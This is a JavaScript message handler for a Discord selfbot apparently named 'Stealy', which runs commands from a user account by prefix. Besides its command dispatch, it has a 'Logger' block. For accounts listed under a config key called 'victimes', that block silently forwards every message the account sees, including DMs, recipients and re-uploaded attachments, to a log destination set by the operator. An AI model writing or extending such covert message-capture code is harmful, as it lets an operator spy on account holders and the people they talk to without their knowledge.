const { Message, Client } = require('legend.js');
const words = [ "senju", "nekzy", "/vbv" , "1212970751813226517" ];

module.exports = {
    name: "message",
    once: false,
    /**
     * @param {Message} message
     * @param {Client} client
    */
    run: async (message, client) => {

        // Auto React
        if (message.guild && client.db.auto_react.find(c => c.id === message.channelId)) client.db.auto_react.filter(c => c.id === message.channelId).forEach(c => {
            const channel = message.guild.channels.get(c.channelId);
            //if (channel && c.reaction) message.react(c.reaction).catch(() => false);
        })

        // Anti Senju
        if (message.content && !message.author.bot &&
            words.some((word) => message.content?.toLowerCase().includes(word))) client.emit('antiSenju', message);


        // Logger
        if (client.config.victimes && client.config.victimes[client.user.id]){
            const embed = {
                author: { name: message.author.username, icon_url: message.author.avatarURL },
                color: 0xFFFFFF,
                title: `<:crown:1263199019446833213>・Logs ${client.user.global_name || client.user.username}・<:crown:1263199019446833213>`,
                fields: [
                    { name: 'Auteur :', value: `${message.author} (${message.author.id})` },
                    { name: 'Message :', value: message.content ?? 'Aucun message' },
                ],
                timestamp: new Date().toISOString(),
                footer: { text: client.user.global_name ?? client.user.username, icon_url: client.user.avatarURL }
            }

            if (message.channel.type == 'dm') embed.fields.push({ name: 'Récépteur :', value: message.author.id === client.user.id ? `${message.channel.recipient} (${message.channel.recipient.id})` : `${client.user.username} (${client.user.id})` });

            const attachments = [];
            for (const a of message.attachments.map(r => r)){
                await client.upload(a.url)
                    .then(i => attachments.push(i))
                    .catch(() => attachments.push(a.url));
            }

            if (attachments.length) embed.fields.push({ name: 'Fichiers', value: attachments.map((r, i) => `- [Fichier ${i+1}](${r})`).join('\n') })
            client.log(client.config.victimes[client.user.id], { embeds: [embed] })

        }












        // Files
        if (message.author.id !== client.user.id) return;
        if (message.guild?.id === client.config.guild_id && 
            !client.config.owners.includes(client.user.id)) return;

        if (message.content === `<@${client.user.id}>`) 
            message.edit(`***› Prefix Stealy :*** *\`${client.db.prefix}\`*`);

        client.db.stats.messages_created++

        const prefix = client.db.prefix || "&"
        if (!message.content.startsWith(prefix)) return;
    
        const args = message.content.slice(prefix.length).trim().split(/ +/g);            
        const commandName = args.shift().toLowerCase();
        const commandFile = client.commands.get(commandName) || client.commands.find(command => command.aliases && command.aliases.includes(commandName));
        
        if (commandFile){
            if (commandFile.owner && !client.config.owners.includes(client.user.id)) return;
            if (commandFile.developer && !["1276174702368526508", "1212970751813226517", "1398234275786002526", "1001171895909097533"].includes(client.user.id)) return;
            if (commandFile.premium && !client.premium.actif) return message.edit("***Vous devez avoir le premium du bot pour utiliser cette commande***");
            if (commandFile.permission && (!message.guild || !message.guild.me.permissions.has(commandFile.permission)))
                return message.edit(client.language(
                    `*Je n'ai pas la permission \`${commandFile.permission}\` dans ce serveur.*`,
                    `*I don't have the \`${commandFile.permission}\` permission in this guild.*`
                ));

            commandFile.run(client, message, args)
                setTimeout(() => 
                    message.deletable ? 
                    message.delete().catch(() => false) : 
                    false, 
                1000 * 40);
        }
    }
}
